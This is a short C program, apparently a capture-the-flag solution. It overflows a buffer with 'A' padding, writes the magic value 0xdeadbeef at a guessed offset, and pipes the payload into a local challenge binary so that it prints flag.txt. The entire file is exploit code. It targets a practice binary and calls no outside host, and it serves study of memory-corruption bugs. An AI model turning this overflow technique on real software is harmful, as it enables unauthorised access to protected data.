#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
    // 1. Trying different offsets. 
    // Usually 32, 36, 40, 44, 48, or 52.
    int offset = 44; 
    unsigned int magic = 0xdeadbeef;

    char payload[100];
    memset(payload, 'A', sizeof(payload));

    // 2. Placing the magic value at the offset
    // Using a pointer cast to ensure raw byte copy
    *(unsigned int*)(payload + offset) = magic;

    // 3. Newline for scanf
    payload[offset + 4] = '\n';

    // 4. Execute and feed input
    FILE *fp = popen("./bin/keycard", "w");
    if (fp == NULL) return 1;

    printf("[+] Attempting exploit with offset %d...\n", offset);
    fwrite(payload, 1, offset + 5, fp);
    
    // Give the program a moment to run system("cat flag.txt")
    fflush(fp);
    usleep(100000); 
    
    pclose(fp);
    return 0;
}
